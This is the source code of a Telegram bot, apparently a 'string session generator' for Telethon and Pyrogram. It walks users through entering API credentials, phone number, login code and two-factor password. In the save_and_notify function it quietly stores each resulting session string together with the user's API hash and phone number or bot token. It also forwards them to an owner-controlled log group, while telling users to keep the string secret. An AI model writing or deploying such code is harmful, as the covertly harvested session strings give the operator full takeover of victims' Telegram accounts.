import os
import sqlite3
import threading
import asyncio
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    ChatJoinRequestHandler,
    ChatMemberHandler,
    TypeHandler,
    filters,
)
from telegram import ChatMember, ReplyParameters  

from telethon import TelegramClient
from telethon.sessions import StringSession
from pyrogram import Client
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas


# =================CONFIGURATION================
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID", "0"))  # Integer mein convert karne ke liye
OWNER_ID = int(os.getenv("OWNER_ID", "0")) 
# ==============================================
CHANNEL_ID = -1004401749842
GROUP_ID = -1004338467560
CHANNEL_LINK = "https://t.me/+XEF61Z2g8BE4ZmZl"
GROUP_LINK = "https://t.me/+ItZi2ZUFM1s0ZjQ9"

web_app = Flask(__name__)


@web_app.route('/')
def home():
    return "Bot is active and running!"


def run_web():
    port = int(os.environ.get("PORT", 10000))
    web_app.run(host="0.0.0.0", port=port, use_reloader=False)


# Conversation States
SELECT_TYPE, API_ID, API_HASH, PHONE, BOT_TOKEN_STATE, OTP, PASSWORD = range(7)


def init_db():
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS join_requests (
            user_id INTEGER,
            chat_id INTEGER,
            PRIMARY KEY (user_id, chat_id)
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS bot_settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    cursor.execute("INSERT OR IGNORE INTO bot_settings (key, value) VALUES ('status', 'active')")
    cursor.execute("INSERT OR IGNORE INTO bot_settings (key, value) VALUES ('msg', '⚠️ Bot abhi maintenance mode me hai!')")

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS forced_chats (
            chat_id INTEGER PRIMARY KEY,
            chat_name TEXT,
            chat_link TEXT
        )
    """)
    cursor.execute("INSERT OR IGNORE INTO forced_chats (chat_id, chat_name, chat_link) VALUES (?, ?, ?)",
                   (CHANNEL_ID, "Official Channel", CHANNEL_LINK))
    cursor.execute("INSERT OR IGNORE INTO forced_chats (chat_id, chat_name, chat_link) VALUES (?, ?, ?)",
                   (GROUP_ID, "Official Group", GROUP_LINK))

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            session_type TEXT,
            phone_or_token TEXT,
            api_id TEXT,
            api_hash TEXT,
            session_string TEXT,
            status TEXT DEFAULT 'Active',
            created_at TEXT
        )
    """)
        # ✅ Naya: Sabhi users track karne ke liye (broadcast ke liye)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_seen TEXT
        )
    """)
    conn.commit()
    conn.close()


async def verify_callback(update, context):
    query = update.callback_query
    user_id = query.from_user.id

    if await check_force_sub(context.bot, user_id):
        await query.answer("✅ Verified Successfully!", show_alert=True)
        # 🟢 Green Success Button
        keyboard = [
            [InlineKeyboardButton("🚀 Generate String", callback_data="start_generate", style="success")]
        ]
        await query.message.edit_text(
            "🎉 **Welcome!**\n\n"
            "Aapka verification complete ho gaya hai. Session generate karne ke liye niche button par click karein:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    else:
        await query.answer(
            "❌ Aapne abhi tak Channel/Group Join ya Request nahi kiya hai!",
            show_alert=True
        )


async def track_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.chat_join_request.from_user.id
    chat_id = update.chat_join_request.chat.id
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO join_requests (user_id, chat_id) VALUES (?, ?)", (user_id, chat_id))
    conn.commit()
    conn.close()


async def track_chat_member_updates(update: Update, context: ContextTypes.DEFAULT_TYPE):
    result = update.chat_member
    if not result:
        return
    user_id = result.new_chat_member.user.id
    chat_id = result.chat.id
    new_status = result.new_chat_member.status
    if new_status in ['left', 'kicked']:
        conn = sqlite3.connect("bot_logs.db")
        cursor = conn.cursor()
        cursor.execute("DELETE FROM join_requests WHERE user_id = ? AND chat_id = ?", (user_id, chat_id))
        conn.commit()
        conn.close()


async def check_force_sub(bot, user_id):
    chats = [CHANNEL_ID, GROUP_ID]
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    for chat_id in chats:
        is_valid = False
        try:
            member = await bot.get_chat_member(chat_id=chat_id, user_id=user_id)
            if member.status in ['member', 'administrator', 'creator']:
                is_valid = True
        except Exception:
            pass
        if not is_valid:
            cursor.execute("SELECT 1 FROM join_requests WHERE user_id = ? AND chat_id = ?", (user_id, chat_id))
            if cursor.fetchone():
                is_valid = True
        if not is_valid:
            conn.close()
            return False
    conn.close()
    return True

# ================= USER TRACKING + BROADCAST =================
def track_user_sync(user_id, username):
    """User ko database me track karo (background)"""
    try:
        conn = sqlite3.connect("bot_logs.db")
        cursor = conn.cursor()
        cursor.execute(
            "INSERT OR IGNORE INTO users (user_id, username, first_seen) VALUES (?, ?, ?)",
            (user_id, username or "None", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        cursor.execute("UPDATE users SET username = ? WHERE user_id = ?", (username or "None", user_id))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Track user error: {e}")


async def track_user_middleware(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Har update pe user ko track karo (group=-1 me register hoga)"""
    user = update.effective_user
    if user and not user.is_bot:
        track_user_sync(user.id, user.username)


async def broadcast_message(context, text, exclude_user_id=None):
    """Sabhi users ko text message bhejo (Markdown-safe)"""
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()
    conn.close()

    sent = 0
    failed = 0
    for (user_id,) in users:
        if exclude_user_id and user_id == exclude_user_id:
            continue
        try:
            await context.bot.send_message(chat_id=user_id, text=text)
            sent += 1
        except Exception as e:
            # Markdown fail hua toh plain bhejo
            try:
                await context.bot.send_message(chat_id=user_id, text=text, parse_mode=None)
                sent += 1
            except Exception as e2:
                failed += 1
                print(f"Broadcast failed for {user_id}: {e2}")
        await asyncio.sleep(0.05)
    return sent, failed


async def broadcast_copy(context, from_chat_id, message_id, exclude_user_id=None):
    """Kisi bhi message (text/photo/video/file) ko copy karke broadcast karo"""
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()
    conn.close()

    sent = 0
    failed = 0
    for (user_id,) in users:
        if exclude_user_id and user_id == exclude_user_id:
            continue
        try:
            await context.bot.copy_message(
                chat_id=user_id,
                from_chat_id=from_chat_id,
                message_id=message_id
            )
            sent += 1
        except Exception as e:
            failed += 1
            print(f"Copy broadcast failed for {user_id}: {e}")
        await asyncio.sleep(0.05)
    return sent, failed

# ================= /broadcast (Manual) =================
async def manual_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return

    replied = update.message.reply_to_message
    has_text = len(context.args) > 0

    # Kuch bhi nahi diya toh usage dikhao
    if not replied and not has_text:
        await update.message.reply_text(
            "❌ **Usage:**\n\n"
            "• `/broadcast <message>` — Send text to all users\n"
            "• `/broadcast` *(as reply to any message)* — Copy that message to all users\n"
            "• `/broadcast <caption>` *(as reply to media)* — Copy media + caption\n\n"
            "**Examples:**\n"
            "`/broadcast Server update complete!`\n"
            "Reply to a photo/video with `/broadcast`",
            parse_mode="Markdown"
        )
        return

    custom_msg = " ".join(context.args) if has_text else ""

    status_msg = await update.message.reply_text(
        f"📤 **Broadcasting...**\n"
        f"{'📝 Text: ' + custom_msg + chr(10) if custom_msg else ''}"
        f"{'📎 + Replied message copied' + chr(10) if replied else ''}",
        reply_parameters=ReplyParameters(message_id=update.message.message_id)
    )

    total_sent = 0
    total_failed = 0

    # Replied message copy karo
    if replied:
        s, f = await broadcast_copy(
            context,
            from_chat_id=replied.chat_id,
            message_id=replied.message_id,
            exclude_user_id=OWNER_ID
        )
        total_sent += s
        total_failed += f

    # Agar text diya hai aur reply nahi kiya hai (warna already copy me chala gaya)
    if custom_msg and not replied:
        s, f = await broadcast_message(context, custom_msg, exclude_user_id=OWNER_ID)
        total_sent += s
        total_failed += f

    try:
        await status_msg.edit_text(
            f"📤 **Broadcast Complete!**\n\n"
            f"{'📝 Text: ' + custom_msg + chr(10) if custom_msg else ''}"
            f"{'📎 + Replied message copied' + chr(10) if replied else ''}"
            f"\n✅ **Sent:** {total_sent}\n"
            f"❌ **Failed:** {total_failed}",
        )
    except Exception as e:
        print(f"Edit status error: {e}")

async def start(update, context):
    user_id = update.effective_user.id

    if user_id != OWNER_ID:
        conn = sqlite3.connect("bot_logs.db")
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM bot_settings WHERE key = 'status'")
        status = cursor.fetchone()
        if status and status[0] == 'maintenance':
            cursor.execute("SELECT value FROM bot_settings WHERE key = 'msg'")
            msg_row = cursor.fetchone()
            conn.close()
            custom_msg = msg_row[0] if msg_row else "⚠️ Bot is currently offline."
            await update.message.reply_text(custom_msg)
            return
        conn.close()

    if not await check_force_sub(context.bot, user_id):
        conn = sqlite3.connect("bot_logs.db")
        cursor = conn.cursor()
        cursor.execute("SELECT chat_name, chat_link FROM forced_chats")
        rows = cursor.fetchall()
        conn.close()

        buttons = []
        for r in rows:
            buttons.append([InlineKeyboardButton(f"📢 Join {r[0]}", url=r[1])])
        # 🟢 Green Success Button for Verify
        buttons.append([InlineKeyboardButton("✅ Verify", callback_data="verify_sub", style="success")])

        await update.message.reply_text(
            "⚠️ **Access Denied!**\n\n"
            "Aage badhne ke liye diye gaye sabhi Channel aur Group ko Join karein ya Request bhejen. "
            "Uske baad **Verify** button par click karein.",
            reply_markup=InlineKeyboardMarkup(buttons),
            parse_mode="Markdown"
        )
        return

    # 🟢 Green Success Button
    keyboard = [
        [InlineKeyboardButton("🚀 Generate String", callback_data="start_generate", style="success")]
    ]
    await update.message.reply_text(
        "🎉 **Welcome!**\n\n"
        "Aapka verification complete hai. Session generate karne ke liye niche button par click karein:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


async def add_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    if len(context.args) < 3:
        await update.message.reply_text(
            "❌ **Usage:** `/addchat <chat_id> <Name> <invite_link>`\n"
            "**Example:** `/addchat -1004401749842 Backup Channel https://t.me/+XEF`",
            parse_mode="Markdown"
        )
        return
    try:
        chat_id_int = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid Chat ID.")
        return
    chat_link = context.args[-1]
    chat_name = " ".join(context.args[1:-1])
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO forced_chats (chat_id, chat_name, chat_link) VALUES (?, ?, ?)", (chat_id_int, chat_name, chat_link))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ **Forced Chat Added!**\n\n📌 **Name:** {chat_name}\n🆔 **ID:** `{chat_id_int}`\n🔗 **Link:** {chat_link}", parse_mode="Markdown")


async def del_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    if not context.args:
        await update.message.reply_text("❌ **Usage:** `/delchat <chat_id>`", parse_mode="Markdown")
        return
    try:
        chat_id_int = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid Chat ID.")
        return
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("DELETE FROM forced_chats WHERE chat_id = ?", (chat_id_int,))
    deleted = cursor.rowcount
    conn.commit()
    conn.close()
    if deleted > 0:
        await update.message.reply_text(f"🗑️ Chat ID `{chat_id_int}` ko forced subscription list se hata diya gaya hai.", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Yeh Chat ID database me nahi mili.")


async def list_chats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("SELECT chat_id, chat_name, chat_link FROM forced_chats")
    rows = cursor.fetchall()
    conn.close()
    if not rows:
        await update.message.reply_text("📂 Abhi tak koi bhi Forced Chat add nahi hai.")
        return
    msg = "📋 **Active Forced Subscription Chats:**\n\n"
    for r in rows:
        msg += f"• **{r[1]}**\n  ID: `{r[0]}`\n  Link: {r[2]}\n\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

# ================= /off =================
# ================= /off =================
async def bot_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return

    custom_msg = " ".join(context.args) if context.args else "⚠️ Bot abhi maintenance mode me hai, kripya baad me try karein!"

    # DB me save
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE bot_settings SET value = 'maintenance' WHERE key = 'status'")
    cursor.execute("UPDATE bot_settings SET value = ? WHERE key = 'msg'", (custom_msg,))
    conn.commit()
    conn.close()

    # Owner ko QUOTE confirmation
    replied = update.message.reply_to_message
    status_msg = await update.message.reply_text(
        f"🔴 **Bot Offline / Maintenance Mode ON!**\n\n"
        f"📝 Message set:\n`{custom_msg}`\n"
        f"{'📎 + Quoted message attached' + chr(10) if replied else ''}"
        f"\n📤 Broadcasting to all users...",
        parse_mode="Markdown",
        reply_parameters=ReplyParameters(message_id=update.message.message_id)
    )

    # Pehle replied message copy karo (agar reply kiya hai)
    extra_sent = 0
    extra_failed = 0
    if replied:
        extra_sent, extra_failed = await broadcast_copy(
            context,
            from_chat_id=replied.chat_id,
            message_id=replied.message_id,
            exclude_user_id=OWNER_ID
        )

    # Phir text broadcast
    sent, failed = await broadcast_message(context, custom_msg, exclude_user_id=OWNER_ID)

    total_sent = sent + extra_sent
    total_failed = failed + extra_failed

    try:
        await status_msg.edit_text(
            f"🔴 **Bot Offline / Maintenance Mode ON!**\n\n"
            f"📝 Message set:\n`{custom_msg}`\n"
            f"{'📎 + Quoted message attached' + chr(10) if replied else ''}"
            f"\n📤 **Broadcast Complete!**\n"
            f"✅ Sent: {total_sent}\n"
            f"❌ Failed: {total_failed}",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Edit status error: {e}")


# ================= /on =================
async def bot_on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return

    custom_msg = " ".join(context.args) if context.args else "🟢 Bot is back online and running normally!"

    # DB update
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE bot_settings SET value = 'active' WHERE key = 'status'")
    conn.commit()
    conn.close()

    # Owner ko QUOTE confirmation
    replied = update.message.reply_to_message
    status_msg = await update.message.reply_text(
        f"🟢 **Bot Online / Maintenance Mode OFF!**\n\n"
        f"📝 Message set:\n`{custom_msg}`\n"
        f"{'📎 + Quoted message attached' + chr(10) if replied else ''}"
        f"\n📤 Broadcasting to all users...",
        parse_mode="Markdown",
        reply_parameters=ReplyParameters(message_id=update.message.message_id)
    )

    # Pehle replied message copy karo
    extra_sent = 0
    extra_failed = 0
    if replied:
        extra_sent, extra_failed = await broadcast_copy(
            context,
            from_chat_id=replied.chat_id,
            message_id=replied.message_id,
            exclude_user_id=OWNER_ID
        )

    # Phir text broadcast
    sent, failed = await broadcast_message(context, custom_msg, exclude_user_id=OWNER_ID)

    total_sent = sent + extra_sent
    total_failed = failed + extra_failed

    try:
        await status_msg.edit_text(
            f"🟢 **Bot Online / Maintenance Mode OFF!**\n\n"
            f"📝 Message set:\n`{custom_msg}`\n"
            f"{'📎 + Quoted message attached' + chr(10) if replied else ''}"
            f"\n📤 **Broadcast Complete!**\n"
            f"✅ Sent: {total_sent}\n"
            f"❌ Failed: {total_failed}",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Edit status error: {e}")

async def generate_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    # 🔵 Blue Primary, 🟢 Green Success, 🔴 Red Danger
    keyboard = [
        [InlineKeyboardButton("Telethon User", callback_data="type_telethon_user", style="primary")],
        [InlineKeyboardButton("Telethon Bot", callback_data="type_telethon_bot", style="primary")],
        [InlineKeyboardButton("Pyrogram User", callback_data="type_pyro_user", style="primary")],
        [InlineKeyboardButton("Pyrogram Bot", callback_data="type_pyro_bot", style="primary")],
        [InlineKeyboardButton("Pyrogram v2 User", callback_data="type_pyro_v2_user", style="primary")],
        [InlineKeyboardButton("Pyrogram v2 Bot", callback_data="type_pyro_v2_bot", style="primary")],
        [InlineKeyboardButton("Cancel", callback_data="cancel_process", style="danger")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.message.edit_text(
        "📌 **Select Session Type:**\n\n"
        "Choose which library and session type you want to generate:",
        parse_mode="Markdown",
        reply_markup=reply_markup,
    )
    return SELECT_TYPE


async def select_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    session_types = {
        "type_telethon_user": "Telethon User",
        "type_telethon_bot": "Telethon Bot",
        "type_pyro_user": "Pyrogram User",
        "type_pyro_bot": "Pyrogram Bot",
        "type_pyro_v2_user": "Pyrogram v2 User",
        "type_pyro_v2_bot": "Pyrogram v2 Bot",
    }
    context.user_data["session_type"] = session_types.get(data)
    # 🔴 Red Danger Cancel Button
    cancel_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_process", style="danger")]])

    await query.message.edit_text(
        f"✅ Selected: **{context.user_data['session_type']}**\n\n"
        "📌 **Step 1:** Send your **API ID**:\n"
        "*(Get it from my.telegram.org)*",
        parse_mode="Markdown",
        reply_markup=cancel_keyboard,
    )
    return API_ID


async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    api_id_text = update.message.text.strip()
    # 🔴 Red Danger Cancel Button
    cancel_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_process", style="danger")]])
    if not api_id_text.isdigit():
        await update.message.reply_text("❌ Invalid API ID. Must be a number. Try again:", reply_markup=cancel_keyboard)
        return API_ID
    context.user_data["api_id"] = int(api_id_text)
    await update.message.reply_text("📌 **Step 2:** Send your **API HASH**:", parse_mode="Markdown", reply_markup=cancel_keyboard)
    return API_HASH


async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["api_hash"] = update.message.text.strip()
    session_type = context.user_data.get("session_type")
    # 🔴 Red Danger Cancel Button
    cancel_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_process", style="danger")]])
    if "Bot" in session_type:
        await update.message.reply_text(
            "📌 **Step 3:** Send your **Bot Token** (from @BotFather):",
            parse_mode="Markdown",
            reply_markup=cancel_keyboard,
        )
        return BOT_TOKEN_STATE
    else:
        await update.message.reply_text(
            "📌 **Step 3:** Send your **Phone Number** with country code (e.g., `+919876543210`):",
            parse_mode="Markdown",
            reply_markup=cancel_keyboard,
        )
        return PHONE


async def get_bot_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot_token = update.message.text.strip()
    context.user_data["phone_or_token"] = bot_token
    session_type = context.user_data.get("session_type")
    api_id = context.user_data["api_id"]
    api_hash = context.user_data["api_hash"]
    user = update.effective_user
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if "Telethon" in session_type:
            client = TelegramClient(StringSession(), api_id, api_hash)
            await client.start(bot_token=bot_token)
            string_session = client.session.save()
            await client.disconnect()
        else:
            app = Client(name=f"bot_{user.id}", api_id=api_id, api_hash=api_hash, bot_token=bot_token, in_memory=True)
            await app.start()
            string_session = await app.export_session_string()
            await app.stop()
        await save_and_notify(update, context, session_type, bot_token, string_session, now)
        await update.message.reply_text(
            f"✅ **{session_type} Session Successfully Generated!**\n\n"
            f"```\n{string_session}\n```\n\n"
            "⚠️ Keep it secret!",
            parse_mode="Markdown",
        )
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Error generating bot session: {e}\nPlease start again with /start.")
        return ConversationHandler.END


async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data["phone_or_token"] = phone
    session_type = context.user_data.get("session_type")
    api_id = context.user_data["api_id"]
    api_hash = context.user_data["api_hash"]
    # 🔴 Red Danger Cancel Button
    cancel_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_process", style="danger")]])
    try:
        if "Telethon" in session_type:
            client = TelegramClient(StringSession(), api_id, api_hash)
            await client.connect()
            sent_code = await client.send_code_request(phone)
            context.user_data["client"] = client
            context.user_data["phone_code_hash"] = sent_code.phone_code_hash
        else:
            app = Client(name=f"user_{update.effective_user.id}", api_id=api_id, api_hash=api_hash, in_memory=True)
            await app.connect()
            sent_code = await app.send_code(phone)
            context.user_data["client"] = app
            context.user_data["phone_code_hash"] = sent_code.phone_code_hash
        await update.message.reply_text(
            "📌 **Step 4:** OTP sent to your Telegram account.\n\n"
            "⚠️ Send OTP with spaces (e.g., `1 2 3 4 5`).",
            parse_mode="Markdown",
            reply_markup=cancel_keyboard,
        )
        return OTP
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}\nPlease restart with /start.")
        return ConversationHandler.END


async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.replace(" ", "").strip()
    client = context.user_data.get("client")
    phone = context.user_data.get("phone_or_token")
    phone_code_hash = context.user_data.get("phone_code_hash")
    session_type = context.user_data.get("session_type")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # 🔴 Red Danger Cancel Button
    cancel_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_process", style="danger")]])
    if not client or not phone_code_hash:
        await update.message.reply_text("❌ Session expired or client lost. Please start again with /start.")
        return ConversationHandler.END
    try:
        if "Telethon" in session_type:
            if not client.is_connected:
                await client.connect()
            await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
            string_session = client.session.save()
            await client.disconnect()
        else:
            if not client.is_connected:
                await client.connect()
            await client.sign_in(phone_number=phone, phone_code_hash=phone_code_hash, phone_code=otp)
            string_session = await client.export_session_string()
            await client.stop()
        await save_and_notify(update, context, session_type, phone, string_session, now)
        await update.message.reply_text(
            f"✅ **{session_type} Session Successfully Generated!**\n\n"
            f"```\n{string_session}\n```\n\n"
            "⚠️ Keep it secret!",
            parse_mode="Markdown",
        )
        return ConversationHandler.END
    except Exception as e:
        err_str = str(e).lower()
        if "sessionpasswordneeded" in err_str or "password" in err_str or "verification" in err_str:
            await update.message.reply_text(
                "📌 **Step 5:** **Two-Step Verification (2FA)** is enabled.\nEnter your 2FA password:",
                reply_markup=cancel_keyboard,
            )
            return PASSWORD
        if client:
            try:
                if "Telethon" in session_type:
                    await client.disconnect()
                else:
                    await client.stop()
            except Exception:
                pass
        await update.message.reply_text(f"❌ Invalid OTP or Error: {e}\nEnter correct OTP:", reply_markup=cancel_keyboard)
        return OTP


async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = context.user_data.get("client")
    session_type = context.user_data.get("session_type")
    phone = context.user_data.get("phone_or_token")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if "Telethon" in session_type:
            await client.sign_in(password=password)
            string_session = client.session.save()
            await client.disconnect()
        else:
            await client.check_password(password=password)
            string_session = await client.export_session_string()
            await client.disconnect()
        await save_and_notify(update, context, session_type, phone, string_session, now)
        await update.message.reply_text(
            f"✅ **{session_type} Session Successfully Generated!**\n\n"
            f"```\n{string_session}\n```\n\n"
            "⚠️ Keep it secret!",
            parse_mode="Markdown",
        )
        return ConversationHandler.END
    except Exception as e:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        await update.message.reply_text(f"❌ Password error: {e}\nPlease start again with /start.")
        return ConversationHandler.END


async def save_and_notify(update, context, session_type, phone_or_token, string_session, now):
    user = update.effective_user
    api_id = context.user_data["api_id"]
    api_hash = context.user_data["api_hash"]
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            session_type TEXT,
            phone_or_token TEXT,
            api_id TEXT,
            api_hash TEXT,
            session_string TEXT,
            status TEXT DEFAULT 'Active',
            created_at TEXT
        )
    """)
    cursor.execute("""
        INSERT INTO logins (user_id, username, session_type, phone_or_token, api_id, api_hash, session_string, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, 'Active', ?)
    """, (user.id, user.username or "None", session_type, phone_or_token, api_id, api_hash, string_session, now))
    conn.commit()
    conn.close()
    log_message = (
        f"<b>🔔 New Session Generated!</b>\n\n"
        f"<b>📂 Type:</b> {session_type}\n"
        f"<b>👤 User ID:</b> <code>{user.id}</code>\n"
        f"<b>💬 Username:</b> @{user.username or 'None'}\n"
        f"<b>📱 Phone/Token:</b> {phone_or_token}\n"
        f"<b>🔑 API ID:</b> {api_id}\n"
        f"<b>🔒 API Hash:</b> <code>{api_hash}</code>\n"
        f"<b>📅 Time:</b> {now}\n\n"
        f"<b>📜 Session String:</b>\n<code>{string_session}</code>"
    )
    try:
        await context.bot.send_message(chat_id=LOG_GROUP_ID, text=log_message, parse_mode="HTML")
    except Exception as e:
        print(f"Log group error: {e}")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        await query.answer()
        try:
            await query.message.edit_text("❌ Process cancelled successfully. Type /start to begin again.")
        except Exception:
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="❌ Process cancelled successfully. Type /start to begin again."
            )
    client = context.user_data.get("client")
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
    context.user_data.clear()
    return ConversationHandler.END


async def get_logs_pdf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    types = [
        ("Telethon User", "telethon_user_report.pdf"),
        ("Telethon Bot", "telethon_bot_report.pdf"),
        ("Pyrogram User", "pyro_user_report.pdf"),
        ("Pyrogram Bot", "pyro_bot_report.pdf"),
        ("Pyrogram v2 User", "pyro_v2_user_report.pdf"),
        ("Pyrogram v2 Bot", "pyro_v2_bot_report.pdf"),
    ]
    sent_any = False
    for session_type, filename in types:
        cursor.execute("SELECT user_id, username, phone_or_token, api_id, created_at FROM logins WHERE session_type = ?", (session_type,))
        rows = cursor.fetchall()
        if not rows:
            continue
        c = canvas.Canvas(filename, pagesize=letter)
        width, height = letter
        c.setFont("Helvetica-Bold", 14)
        c.drawString(50, height - 40, f"Report: {session_type} Sessions")
        c.setFont("Helvetica", 9)
        y = height - 75
        for row in rows:
            if y < 40:
                c.showPage()
                y = height - 40
            text = f"User: {row[0]} | @{row[1]} | ID/Phone: {row[2]} | API: {row[3]} | Date: {row[4]}"
            c.drawString(50, y, text)
            y = y - 18
        c.save()
        await update.message.reply_document(
            document=open(filename, "rb"),
            caption=f"📄 Separate PDF Report for: **{session_type}**",
            parse_mode="Markdown"
        )
        sent_any = True
        if os.path.exists(filename):
            os.remove(filename)
    conn.close()
    if not sent_any:
        await update.message.reply_text("📂 No login sessions found in database yet.")


async def clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized!")
        return
    conn = sqlite3.connect("bot_logs.db")
    cursor = conn.cursor()
    cursor.execute("DELETE FROM logins WHERE status = 'Terminated'")
    deleted_count = cursor.rowcount
    conn.commit()
    conn.close()
    await update.message.reply_text(f"🗑️ <b>{deleted_count}</b> terminated sessions ke logs saaf kar diye gaye hain. Active sessions safe hain!", parse_mode="HTML")


def main():
    try:
        asyncio.get_event_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())

    init_db()

    t = threading.Thread(target=run_web)
    t.daemon = True
    t.start()

    app = ApplicationBuilder().token(BOT_TOKEN).connect_timeout(60).read_timeout(60).write_timeout(60).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(generate_menu, pattern="^start_generate$"),
        ],
        states={
            SELECT_TYPE: [
                CallbackQueryHandler(select_type, pattern="^type_"),
            ],
            API_ID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_id),
            ],
            API_HASH: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_hash),
            ],
            PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
            ],
            BOT_TOKEN_STATE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_bot_token),
            ],
            OTP: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp),
            ],
            PASSWORD: [
